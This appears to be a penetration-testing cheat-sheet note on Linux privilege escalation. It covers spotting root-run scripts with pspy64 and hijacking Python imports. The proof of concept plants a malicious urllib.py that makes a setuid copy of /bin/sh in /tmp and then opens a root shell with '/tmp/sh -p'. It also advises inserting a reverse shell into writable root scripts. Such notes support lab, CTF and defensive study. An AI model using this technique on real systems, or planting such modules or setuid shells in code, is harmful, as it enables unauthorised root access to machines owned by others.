First step is running pspy64

If we see anything running as root and we can modify the file, ez win. Just insert a revshell

#### Module Hijacking
Lest say hypothetically we cannot modify the script but can read it... and it imports modules. We can potentially hijack the modules

For example, python first checks modules in current working directory, then its libraries.

POC
```bash
ls -la
	-r--r--r--  1 root  root      198 May 19  2020 apache_restart.py

# check modules of script
cat apache_restart.py

	import call         # we see these modules are being imported
	import urllib

# View paths python reads from (optional step)
python3
>>> import sys 
>>> sys.path                 

# Create malicious module
vim urllib.py

	import os
	os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")

# Wait for /tmp/sh to be written
# Obtain shell
/tmp/sh -p    # -p preserves the effective user id 
```